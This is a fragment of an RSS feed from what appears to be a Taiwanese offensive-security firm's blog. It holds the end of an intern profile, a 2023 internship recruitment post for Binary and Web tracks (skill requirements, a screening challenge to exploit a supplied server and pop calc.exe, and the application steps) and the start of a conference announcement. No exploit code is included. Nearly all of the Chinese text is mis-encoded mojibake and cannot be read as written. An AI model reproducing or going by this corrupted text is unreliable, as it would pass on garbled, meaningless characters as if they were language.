&lt;p&gt;å°æ–¼æœªä¾†ï¼ŒVtim æœŸå¾…è‡ªå·±æˆç‚ºå…¨èƒ½å‹çš„ç™½å¸½é§­å®¢ã€‚ã€Œé€²æ”»éç¨‹æœƒé‡åˆ°å¾ˆå¤šä¸åŒçš„ç’°å¢ƒï¼Œä¸åŒæ”»æ“Šéšæ®µä¹Ÿéœ€è¦ä¸åŒé ˜åŸŸçš„æŠ€å·§ï¼Œæˆ‘å¸Œæœ›è‡ªå·±èƒ½æŒæ¡å…¨éƒ¨é¢å‘ï¼Œç¨åŠ›æ’è§£æ‰€æœ‰é›£é¡Œï¼Œé”åˆ°ã€æŒ‡å“ªæ‰“å“ªã€æ”»æ“Šè‡ªå¦‚ã€çš„å¢ƒç•Œã€‚ã€ä»–æ»¿æ‡·æœŸå¾…åœ°èªªã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2023/05/26/from-cybersecurity-muggle-to-red-team-specialist-vtim/</link>
                <guid>https://devco.re/blog/2023/05/26/from-cybersecurity-muggle-to-red-team-specialist-vtim</guid>
                <pubDate>Fri, 26 May 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2023 ç¬¬ä¸‰å±†å¯¦ç¿’ç”Ÿè¨ˆç•«</title>
                <description>&lt;p&gt;DEVCORE å‰µç«‹è¿„ä»Šå·²é€¾åå¹´ï¼ŒæŒçºŒå°ˆæ³¨æ–¼æä¾›ä¸»å‹•å¼è³‡å®‰æœå‹™ï¼Œä¸¦è‡´åŠ›å°‹æ‰¾å„ç¨®å®‰å…¨é¢¨éšªåŠæ¼æ´ï¼Œè®“ä¸–ç•Œè®Šå¾—æ›´å®‰å…¨ã€‚ç‚ºäº†æŒçºŒå°‹æ‰¾æ›´å¤šæ“æœ‰ç›¸åŒç†å¿µçš„è³‡å®‰æ–°éŠ³ã€å”åŠ©å­¸ç”Ÿå»ºæ§‹æ­£ç¢ºè³‡å®‰æ„è­˜åŠæŠ€èƒ½ï¼Œæˆ‘å€‘æˆç«‹äº†ã€Œæˆ´å¤«å¯‡çˆ¾å…¨åœ‹è³‡è¨Šå®‰å…¨çå­¸é‡‘ã€ï¼Œ2022 å¹´åˆä¹Ÿé–‹å§‹èˆ‰è¾¦é¦–å±†å¯¦ç¿’ç”Ÿè¨ˆç•«ï¼Œç›®å‰ç‚ºæ­¢æˆæœé —è±ã€è¶…ä¹é æœŸï¼Œç¬¬äºŒå±†å¯¦ç¿’ç”Ÿè¨ˆç•«ä¹Ÿå°‡æ–¼ä»Šå¹´ 2 æœˆåº•å‘Šä¸€æ®µè½ã€‚æˆ‘å€‘å¾ˆæ¦®å¹¸åœ°å®£ä½ˆï¼Œç¬¬ä¸‰å±†å¯¦ç¿’ç”Ÿè¨ˆç•«å³å°‡ç™»å ´ï¼Œè‹¥æ‚¨æœŸå¾…åŠ å…¥æˆ‘å€‘ã€ç²¾é€²è³‡å®‰æŠ€èƒ½ï¼Œç…©è«‹è©³é–±ä¸‹åˆ—è³‡è¨Šå¾Œä¾†ä¿¡å ±åï¼&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;å¯¦ç¿’å…§å®¹&quot;&gt;å¯¦ç¿’å…§å®¹&lt;/h3&gt;

&lt;p&gt;æœ¬æ¬¡å¯¦ç¿’åˆ†ç‚º Binary åŠ Web å…©å€‹çµ„åˆ¥ï¼Œä¸»è¦å…§å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Binary
ä»¥ç ”ç©¶ç‚ºä¸»ï¼Œåœ¨èˆ‡å°å¸«ç¢ºå®šç ”ç©¶æ¨™çš„å¾Œï¼Œåˆ†æç›®æ¨™æ¶æ§‹ã€é€²è¡Œé€†å‘å·¥ç¨‹æˆ–ç¨‹å¼ç¢¼å¯©æŸ¥ã€‚è—‰ç”±é€™å€‹éç¨‹è¨“ç·´è‡ªå·±çš„æ€è·¯ï¼Œæ‰¾å‡ºå¯èƒ½çš„æ”»æ“Šé¢èˆ‡æ½›åœ¨çš„å¼±é»ã€‚å¦å¤–ä¹Ÿæœƒè®“å¤§å®¶å˜—è©¦åˆ†æåŠå¯«éå¾€æ¼æ´çš„ Exploitï¼Œç†è§£éå»æ¼æ´éƒ½å‡ºç¾åœ¨å“ªï¼Œé«”é©—çœŸå¯¦ä¸–ç•Œçš„æ¼æ´éƒ½æ˜¯å¦‚ä½•åˆ©ç”¨ã€‚
    &lt;ul&gt;
      &lt;li&gt;æ¼æ´æŒ–æ˜åŠç ”ç©¶ 70 %&lt;/li&gt;
      &lt;li&gt;1-day é–‹ç™¼ (Exploitation)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Web
ä¸»è¦å…§å®¹ç‚ºç ”ç©¶éå¾€æ¼æ´èˆ‡è¿‘å¹´å¸¸è¦‹æ–°å‹æ…‹æ¼æ´ã€æ”»æ“Šæ‰‹æ³•ï¼Œéœ€è¦è£½ä½œæŠ•å½±ç‰‡ä»‹ç´¹æˆæœä¸¦å»ºç½®å¯ä¾›ä»–äººé‡ç¾å¼±é»çš„æ¨¡æ“¬æ¸¬è©¦ç’°å¢ƒ (Lab)ï¼Œå¦å¯èƒ½éœ€è¦æ’°å¯«æˆ–ä¿®æ”¹å¯åˆ©ç”¨æ”»æ“Šç¨‹å¼é€²è¡Œå¼±é»é©—è­‰ã€‚
    &lt;ul&gt;
      &lt;li&gt;æ¼æ´åŠæ”»æ“Šæ‰‹æ³•ç ”ç©¶ 70%&lt;/li&gt;
      &lt;li&gt;å»ºç½® Lab 30%&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å…¬å¸åœ°é»&quot;&gt;å…¬å¸åœ°é»&lt;/h3&gt;

&lt;p&gt;å°åŒ—å¸‚æ¾å±±å€å…«å¾·è·¯ä¸‰æ®µ 32 è™Ÿ 13 æ¨“&lt;/p&gt;

&lt;h3 id=&quot;å¯¦ç¿’æ™‚é–“&quot;&gt;å¯¦ç¿’æ™‚é–“&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2023 å¹´ 3 æœˆé–‹å§‹åˆ° 2023 å¹´ 7 æœˆåº•ï¼Œå…± 5 å€‹æœˆã€‚&lt;/li&gt;
  &lt;li&gt;æ¯é€±å·¥ä½œå…©å¤©ï¼Œå·¥ä½œæ™‚é–“ç‚º 10:00 â€“ 18:00
    &lt;ul&gt;
      &lt;li&gt;æ¯é€±å›ºå®šä¸€å¤©ä¸‹åˆ 14:00 - 18:00 å¿…é ˆåˆ°å…¬å¸è¨è«–é€²åº¦
        &lt;ul&gt;
          &lt;li&gt;å¦‚æœå±…ä½é›™åŒ—å¤–å¯å½ˆæ€§èª¿æ•´(ä½†é ˆæ¯å€‹çµ„åˆ¥çµ±ä¸€)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;å…¶é¤˜æ™‚é–“çš†ç‚ºé ç«¯ä½œæ¥­&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;æ‹›å‹Ÿå°è±¡&quot;&gt;æ‹›å‹Ÿå°è±¡&lt;/h3&gt;

&lt;p&gt;å¤§å°ˆé™¢æ ¡å¤§ä¸‰ï¼ˆå«ï¼‰ä»¥ä¸Šå…·æœ‰ä¸€å®šç¨‹åº¦è³‡å®‰èƒŒæ™¯çš„å­¸ç”Ÿ&lt;/p&gt;

&lt;h3 id=&quot;é è¨ˆæ‹›æ”¶åé¡&quot;&gt;é è¨ˆæ‹›æ”¶åé¡&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Binary çµ„ï¼š2~3 äºº&lt;/li&gt;
  &lt;li&gt;Web çµ„ï¼š2~3 äºº&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;è–ªè³‡å¾…é‡&quot;&gt;è–ªè³‡å¾…é‡&lt;/h3&gt;

&lt;p&gt;æ¯æœˆæ–°å°å¹£ 16,000 å…ƒ&lt;/p&gt;

&lt;h2 id=&quot;æ‹›å‹Ÿæ¢ä»¶è³‡æ ¼èˆ‡æµç¨‹&quot;&gt;æ‹›å‹Ÿæ¢ä»¶è³‡æ ¼èˆ‡æµç¨‹&lt;/h2&gt;

&lt;h3 id=&quot;å¯¦ç¿’æ¢ä»¶è¦æ±‚&quot;&gt;å¯¦ç¿’æ¢ä»¶è¦æ±‚&lt;/h3&gt;

&lt;h4 id=&quot;binary&quot;&gt;Binary&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;åŸºæœ¬é€†å‘å·¥ç¨‹åŠé™¤éŒ¯èƒ½åŠ›
    &lt;ul&gt;
      &lt;li&gt;èƒ½çœ‹æ‡‚çµ„åˆèªè¨€ä¸¦ç­è§£åŸºæœ¬ Debugger ä½¿ç”¨æŠ€å·§&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;åŸºæœ¬æ¼æ´åˆ©ç”¨èƒ½åŠ›
    &lt;ul&gt;
      &lt;li&gt;é ˆçŸ¥é“ Stack overflowã€ROP ç­‰ç›¸é—œåˆ©ç”¨æŠ€å·§&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;åŸºæœ¬ Scripting Language é–‹ç™¼èƒ½åŠ›
    &lt;ul&gt;
      &lt;li&gt;Pythonã€Ruby&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å…·å‚™åˆ†æå¤§å‹ Open Source å°ˆæ¡ˆèƒ½åŠ›
    &lt;ul&gt;
      &lt;li&gt;ä»¥ C/C++ ç‚ºä¸»&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å…·å‚™åŸºç¤ä½œæ¥­ç³»çµ±çŸ¥è­˜
    &lt;ul&gt;
      &lt;li&gt;ä¾‹å¦‚çŸ¥é“ Virtual Address èˆ‡ Physical Address çš„æ¦‚å¿µ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Code Auditing
    &lt;ul&gt;
      &lt;li&gt;çŸ¥é“æ€æ¨£å¯«çš„ç¨‹å¼ç¢¼æœƒæœ‰å•é¡Œ
        &lt;ul&gt;
          &lt;li&gt;Buffer Overflow&lt;/li&gt;
          &lt;li&gt;Use After free&lt;/li&gt;
          &lt;li&gt;Race Condition&lt;/li&gt;
          &lt;li&gt;â€¦&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å…·å‚™ç ”ç©¶ç†±èª ï¼Œç¿’æ…£äº†è§£æŠ€è¡“æœ¬è³ª&lt;/li&gt;
  &lt;li&gt;åŠ åˆ†ä½†&lt;strong&gt;éå¿…è¦&lt;/strong&gt;æ¢ä»¶
    &lt;ul&gt;
      &lt;li&gt;CTF æ¯”è³½ç¶“é©—&lt;/li&gt;
      &lt;li&gt;pwnable.tw æˆç¸¾&lt;/li&gt;
      &lt;li&gt;æ¨‚æ–¼åˆ†äº«æŠ€è¡“
        &lt;ul&gt;
          &lt;li&gt;æœ‰å…¬é–‹çš„æŠ€è¡“ blog/slideã€Write-ups æˆ–æ˜¯æ¼”è¬›&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;ç²¾é€š IDA Pro æˆ– Ghidra&lt;/li&gt;
      &lt;li&gt;æœ‰å¯«é 1-day åˆ©ç”¨ç¨‹å¼&lt;/li&gt;
      &lt;li&gt;å…·å‚™ä¸‹åˆ—å…¶ä¸­ä¹‹ä¸€ç¶“é©—
        &lt;ul&gt;
          &lt;li&gt;Kernel Exploit&lt;/li&gt;
          &lt;li&gt;Windows Exploit&lt;/li&gt;
          &lt;li&gt;Browser Exploit&lt;/li&gt;
          &lt;li&gt;Bug Bounty&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;web&quot;&gt;Web&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;ç†Ÿæ‚‰ OWASP Web Top 10ã€‚&lt;/li&gt;
  &lt;li&gt;ç†è§£ PortSwigger Web Security Academy ä¸­æ‰€æœ‰çš„å®‰å…¨è­°é¡Œæˆ–å·²å®Œæˆæ‰€æœ‰ Labã€‚
    &lt;ul&gt;
      &lt;li&gt;åƒè€ƒé€£çµï¼šhttps://portswigger.net/web-security/all-materials&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ç†è§£è¨ˆç®—æ©Ÿç¶²è·¯çš„åŸºæœ¬æ¦‚å¿µã€‚&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ Command Line æ“ä½œï¼ŒåŒ…å« Unix-like å’Œ Windows ä½œæ¥­ç³»çµ±çš„å¸¸è¦‹æˆ–å…§å»ºç³»çµ±æŒ‡ä»¤å·¥å…·ã€‚&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ä»»ä¸€ç¨®ç¶²é ç¨‹å¼èªè¨€ï¼ˆå¦‚ï¼šPHPã€ASP.NETã€JSPï¼‰ï¼Œå…·å‚™å¯ä»¥å»ºç«‹å®Œæ•´ç¶²é æœå‹™çš„èƒ½åŠ›ã€‚&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ä»»ä¸€ç¨® Scripting Languageï¼ˆå¦‚ï¼šShell Scriptã€Pythonã€Rubyï¼‰ï¼Œä¸¦èƒ½ä½¿ç”¨è…³æœ¬è¼”ä»¥ç ”ç©¶ã€‚&lt;/li&gt;
  &lt;li&gt;å…·å‚™é™¤éŒ¯èƒ½åŠ›ï¼Œèƒ½å–„ç”¨ Debugger è¿½è¹¤ç¨‹å¼æµç¨‹ã€èƒ½é‡ç¾ä¸¦æ”¶æ–‚å•é¡Œã€‚&lt;/li&gt;
  &lt;li&gt;å…·å‚™å¯ä»¥å»ºç½®ã€è¨­å®šå¸¸è¦‹ç¶²é ä¼ºæœå™¨ï¼ˆå¦‚ï¼šNginxã€Apacheï¼‰åŠä½œæ¥­ç³»çµ±ï¼ˆå¦‚ï¼šLinuxï¼‰çš„èƒ½åŠ›ã€‚&lt;/li&gt;
  &lt;li&gt;å…·å‚™è¿½æ ¹ç©¶æŸ¢çš„ç²¾ç¥ã€‚&lt;/li&gt;
  &lt;li&gt;åŠ åˆ†ä½†&lt;strong&gt;éå¿…è¦&lt;/strong&gt;æ¢ä»¶
    &lt;ul&gt;
      &lt;li&gt;æ›¾ç¶“ç¨ç«‹æŒ–æ˜é 0-day æ¼æ´ã€‚&lt;/li&gt;
      &lt;li&gt;æ›¾ç¶“ç¨ç«‹åˆ†æéå·²çŸ¥æ¼æ´ä¸¦èƒ½æ’°å¯« 1-day exploitã€‚&lt;/li&gt;
      &lt;li&gt;æ›¾ç¶“æ–¼ CTF æ¯”è³½ä¸­æ“”ä»»å‡ºé¡Œè€…ä¸¦å»ºç½®éé¡Œç›®ã€‚&lt;/li&gt;
      &lt;li&gt;æ“æœ‰ OSCP è­‰ç…§æˆ–åŒç­‰èƒ½åŠ›ä¹‹è­‰ç…§ã€‚&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;æ‡‰å¾µæµç¨‹&quot;&gt;æ‡‰å¾µæµç¨‹&lt;/h3&gt;

&lt;p&gt;æœ¬æ¬¡ç”„é¸ä¸€å…±åˆ†ç‚ºä¸‰å€‹éšæ®µï¼š&lt;/p&gt;

&lt;h4 id=&quot;ç¬¬ä¸€éšæ®µæ›¸é¢å¯©æŸ¥&quot;&gt;ç¬¬ä¸€éšæ®µï¼šæ›¸é¢å¯©æŸ¥&lt;/h4&gt;

&lt;p&gt;ç¬¬ä¸€éšæ®µç‚ºæ›¸é¢å¯©æŸ¥ï¼Œæœƒéœ€è¦å¯©æŸ¥ä¸‹åˆ—å…©å€‹é …ç›®&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;æ›¸é¢å¯©æŸ¥&lt;/li&gt;
  &lt;li&gt;ç°¡ç­”é¡ŒåŠå¯¦ä½œé¡Œç­”æ¡ˆ
    &lt;ul&gt;
      &lt;li&gt;æ‡‰å¾µ Binary å¯¦ç¿’ç”Ÿéœ€é¡å¤–åœ¨å±¥æ­·é™„ä¸Šä¸‹è¿°å•é¡Œç­”æ¡ˆ
        &lt;ul&gt;
          &lt;li&gt;ç°¡ç­”é¡Œ
            &lt;ul&gt;
              &lt;li&gt;è«‹æå‡ºä¸‰å€‹ï¼Œä½ å°è±¡æœ€æ·±åˆ»æˆ–æ„Ÿåˆ°æœ‰è¶£ã€æ–¼è¥¿å…ƒ 2020 ~ 2023 å¹´é–“å…¬é–‹çš„çœŸå¯¦æ¼æ´æˆ–æ”»æ“Šéˆæ¡ˆä¾‹ï¼Œä¸¦ä¾è‡ªå·±çš„ç†è§£ç°¡è¿°èªªæ˜å„å€‹æ¼æ´çš„æˆå› ã€åˆ©ç”¨æ¢ä»¶å’Œå¯ä»¥é€ æˆçš„å½±éŸ¿ã€‚&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;å¯¦ä½œé¡Œç›®
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;/assets/files/recruit/binary/2022_Intern_Challenge-2.zip&quot;&gt;é¡Œç›®æª”æ¡ˆ&lt;/a&gt;
                &lt;ul&gt;
                  &lt;li&gt;ç‚ºä¸€å€‹äº’å‹•å¼çš„ Serverï¼Œå¯é€éç¶²è·¯é€£ç·šèˆ‡ä¹‹äº’å‹•ã€‚&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;è«‹åˆ†æä¸Šè¿°æ‰€æä¾›çš„ Serverï¼Œä¸¦åˆ©ç”¨å…¶ä¸­çš„æ¼æ´åœ¨ Windows 11 ä¸Šè·³å‡º calc.exeã€‚
                &lt;ul&gt;
                  &lt;li&gt;æ¼æ´å¯èƒ½æœ‰å¾ˆå¤šï¼Œä¸ä¸€å®šæ¯å€‹éƒ½å¯ä»¥åˆ©ç”¨ã€‚&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;è«‹å‹™å¿…å¯«ä¸‹è§£é¡Œéç¨‹åŠå¦‚ä½•å»åˆ†æé€™å€‹ Serverï¼Œä¸¦äº¤ write-upï¼Œè«‹ç›¡ä½ æ‰€èƒ½ä¾†è§£é¡Œï¼Œå³ä½¿æœ€å¾Œæ²’æœ‰æˆåŠŸï¼Œä¹Ÿè«‹å¯«ä¸‹æ‚¨æ‰€å˜—è©¦éçš„æ–¹æ³•åŠæ€è·¯ï¼Œæœ¬æ¸¬é©—å°‡æœƒä»¥ write-up ç‚ºä¸»è¦ä¾æ“šã€‚&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;æ‡‰å¾µ Web å¯¦ç¿’ç”Ÿéœ€é¡å¤–åœ¨å±¥æ­·é™„ä¸Šä¸‹è¿°å•é¡Œç­”æ¡ˆ
        &lt;ul&gt;
          &lt;li&gt;ç°¡ç­”é¡Œ
            &lt;ul&gt;
              &lt;li&gt;è«‹æå‡ºä¸‰å€‹ï¼Œä½ å°è±¡æœ€æ·±åˆ»æˆ–æ„Ÿåˆ°æœ‰è¶£ã€æ–¼è¥¿å…ƒ 2020 ~ 2023 å¹´é–“å…¬é–‹çš„çœŸå¯¦æ¼æ´æˆ–æ”»æ“Šéˆæ¡ˆä¾‹ï¼Œä¸¦ä¾è‡ªå·±çš„ç†è§£ç°¡è¿°èªªæ˜å„å€‹æ¼æ´çš„æˆå› ã€åˆ©ç”¨æ¢ä»¶å’Œå¯ä»¥é€ æˆçš„å½±éŸ¿ã€‚&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æœ¬éšæ®µæ”¶ä»¶æˆªæ­¢æ™‚é–“ç‚º &lt;strong&gt;2023/2/3 10:00&lt;/strong&gt;ï¼Œæˆ‘å€‘æœƒæ ¹æ“šæ‚¨çš„å±¥æ­·åŠé¡Œç›®æ‰€å›ç­”çš„å…§å®¹ä¾†æ±ºå®šæ˜¯å¦æœ‰é€šéç¬¬ä¸€éšæ®µï¼Œæˆ‘å€‘æœƒåœ¨ä¸ƒå€‹&lt;strong&gt;å·¥ä½œå¤©&lt;/strong&gt;å…§å›è¦†ã€‚&lt;/p&gt;

&lt;h4 id=&quot;ç¬¬äºŒéšæ®µèƒ½åŠ›æ¸¬é©—&quot;&gt;ç¬¬äºŒéšæ®µï¼šèƒ½åŠ›æ¸¬é©—&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Binary
    &lt;ul&gt;
      &lt;li&gt;ç„¡&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Web
    &lt;ul&gt;
      &lt;li&gt;ç¬¬äºŒéšæ®µæœƒæ ¹æ“šæ‚¨çš„å±¥æ­·æˆ–æ˜¯ä»»ä½•å¯è­‰æ˜å…·å‚™è¶³å¤  Web æ»²é€ç›¸é—œæŠ€èƒ½çš„è³‡æ–™ä¾†æ±ºå®šæ˜¯å¦éœ€è¦å¦å¤–åšé¡Œç›®ï¼Œå¦‚æœæœªé”æ¨™æº–æœƒå¦å¤–æº–å‚™é¶æ©Ÿæ¸¬é©—ï¼Œå¾…æˆ‘å€‘æ”¶åˆ°è§£é¡Œéç¨‹å¾Œï¼Œå°‡æœƒæ ¹æ“šæ‚¨çš„ç‹€æ³æ±ºå®šæ˜¯å¦å¯ä»¥é€²å…¥ç¬¬ä¸‰éšæ®µã€‚&lt;/li&gt;
      &lt;li&gt;æœ¬éšæ®µæ”¶ä»¶æ™‚é–“ç‚º &lt;strong&gt;2023/2/5 23:59&lt;/strong&gt;ï¼Œå»ºè­°ææ—©éäº¤å±¥æ­·ï¼Œå¯ä»¥æå‰ä½œç­”ã€‚&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;ç¬¬ä¸‰éšæ®µé¢è©¦&quot;&gt;ç¬¬ä¸‰éšæ®µï¼šé¢è©¦&lt;/h4&gt;
&lt;p&gt;æ­¤éšæ®µç‚º 1~2 å°æ™‚çš„é¢è©¦ï¼Œæœƒæœ‰ 2~3 ä½è³‡æ·±å¤¥ä¼´åƒèˆ‡ï¼Œè©•ä¼°æ‚¨æ˜¯å¦å…·å‚™æœ¬æ¬¡å¯¦ç¿’æ‰€éœ€çš„æŠ€è¡“èƒ½åŠ›èˆ‡äººæ ¼ç‰¹è³ªã€‚&lt;/p&gt;

&lt;h3 id=&quot;å ±åæ–¹å¼&quot;&gt;å ±åæ–¹å¼&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;è«‹å°‡æ‚¨çš„&lt;strong&gt;å±¥æ­·&lt;/strong&gt;åŠ&lt;strong&gt;é¡Œç›®ç­”æ¡ˆ&lt;/strong&gt;ä»¥ PDF æ ¼å¼å¯„åˆ° recruiting_intern@devco.re
    &lt;ul&gt;
      &lt;li&gt;å±¥æ­·æ ¼å¼è«‹åƒè€ƒç¯„ä¾‹ç¤ºæ„ï¼ˆ&lt;a href=&quot;/assets/files/recruit/Resume_Example.docx&quot;&gt;DOCX&lt;/a&gt;ã€&lt;a href=&quot;/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;ã€&lt;a href=&quot;/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;ï¼‰ä¸¦è½‰æˆ PDFã€‚è‹¥æ‚¨æœ‰è‡ªä¿¡ï¼Œä¹Ÿå¯ä»¥è‡ªç”±ç™¼æ®æœ€èƒ½å‘ˆç¾æ‚¨èƒ½åŠ›çš„å±¥æ­·ã€‚&lt;/li&gt;
      &lt;li&gt;è«‹æ–¼ &lt;strong&gt;2023/02/03 10:00&lt;/strong&gt; å‰å¯„å‡ºï¼ˆå¦‚æœåé¡å·²æ»¿å‰‡è¦–æƒ…æ³ææ—©çµæŸï¼‰&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ä¿¡ä»¶æ¨™é¡Œæ ¼å¼ï¼š[æ‡‰å¾µ] è·ä½ æ‚¨çš„å§“åï¼ˆç¯„ä¾‹ï¼š[æ‡‰å¾µ] Web çµ„å¯¦ç¿’ç”Ÿ ç‹å°ç¾ï¼‰&lt;/li&gt;
  &lt;li&gt;å±¥æ­·å…§å®¹è«‹å‹™å¿…æ§åˆ¶åœ¨ä¸‰é ä»¥å…§ï¼Œè‡³å°‘éœ€åŒ…å«ä»¥ä¸‹å…§å®¹ï¼š
    &lt;ul&gt;
      &lt;li&gt;åŸºæœ¬è³‡æ–™&lt;/li&gt;
      &lt;li&gt;å­¸æ­·&lt;/li&gt;
      &lt;li&gt;å¯¦ç¿’ç¶“æ­·&lt;/li&gt;
      &lt;li&gt;ç¤¾ç¾¤æ´»å‹•ç¶“æ­·&lt;/li&gt;
      &lt;li&gt;ç‰¹æ®Šäº‹è¹Ÿ&lt;/li&gt;
      &lt;li&gt;éå»å°æ–¼è³‡å®‰çš„ç›¸é—œç ”ç©¶&lt;/li&gt;
      &lt;li&gt;å°æ–¼é€™ä»½å¯¦ç¿’çš„æœŸæœ›&lt;/li&gt;
      &lt;li&gt;MBTI è·æ¥­æ€§æ ¼æ¸¬è©¦çµæœï¼ˆ&lt;a href=&quot;https://www.apesk.com/mbti/dati_tw.asp&quot;&gt;æ¸¬è©¦ç¶²é &lt;/a&gt;ï¼‰&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è‹¥æœ‰æ‡‰å¾µç›¸é—œå•é¡Œï¼Œè«‹ä¸€å¾‹ä½¿ç”¨ Email è¯ç¹«ï¼Œå¦‚é€ æˆæ‚¨çš„ä¸ä¾¿è«‹è¦‹è«’ï¼Œæˆ‘å€‘æ„Ÿè¬æ‚¨çš„ä¾†ä¿¡ï¼Œä¸¦æœŸå¾…æ‚¨çš„åŠ å…¥ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2023/01/14/3rd-internship-program-recruit/</link>
                <guid>https://devco.re/blog/2023/01/14/3rd-internship-program-recruit</guid>
                <pubDate>Sat, 14 Jan 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE CONFERENCE 2023 å³æ—¥èµ·é–‹æ”¾å ±å</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: 0.7em;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
    .center-image {
        margin: 0 auto;
        display: block;
    }
&lt;/style&gt;

&lt;p&gt;DEVCORE å¾ˆé«˜èˆˆåœ°å®£ä½ˆï¼Œç´”æ”»æ“Šå°å‘çš„å°ˆæ¥­æŠ€è¡“ç ”è¨æœƒ DEVCORE CONFERENCEï¼Œåœ¨æšŒé•ä¸‰å¹´å¾Œï¼Œå°‡æ–¼ 3 æœˆ 10 æ—¥è‡³ ï¼“ æœˆ 11 æ—¥æ–¼å°åŒ— TICC åœ‹éš›æœƒè­°ä¸­å¿ƒå†æ¬¡ç››å¤§èˆ‰è¡Œï¼Œå³æ—¥èµ·é–‹æ”¾å ±åï¼ŒåŒæ™‚ç‚ºæ…¶ç¥ DEVCORE å‰µç«‹åé€±å¹´ï¼Œé™¤äº†åŸæœ‰çš„é§­å®¢æŠ€è¡“è­°ç¨‹å¤–ï¼Œç‰¹åˆ¥åŠ é–‹ä¼æ¥­å ´ã€‚&lt;/p&gt;

&lt;p&gt;ã€ŒDEVCORE åå¹´ä¾†æŒçºŒæä¾›ä¼æ¥­é ‚å°–çš„ä¸»å‹•å¼è³‡å®‰æœå‹™ï¼Œå¾ˆé«˜èˆˆçœ‹åˆ°è³‡å®‰èˆ‡ç´…éšŠæ¼”ç·´æ—¥æ¼¸å—åˆ°å°ç£æ¥­ç•Œèˆ‡æ”¿åºœå–®ä½é‡è¦–ï¼Œå¸Œæœ›å°‡æˆ‘å€‘ä¸€è·¯ç´¯ç©çš„ç¶“é©—èˆ‡èƒ½é‡ï¼Œä¸è—ç§åœ°åˆ†äº«çµ¦æ‰€æœ‰å¿—åŒé“åˆçš„å¤¥ä¼´ï¼Œå…±åŒç‚ºå°ç£è³‡å®‰ç”¢æ¥­çš„ç™¼å±•ä¸¦è‚©ä½œæˆ°ã€‚ã€åŸ·è¡Œé•·æš¨å…±åŒå‰µè¾¦äººç¿æµ©æ­£ï¼ˆAllenï¼‰è¡¨ç¤ºã€‚&lt;/p&gt;

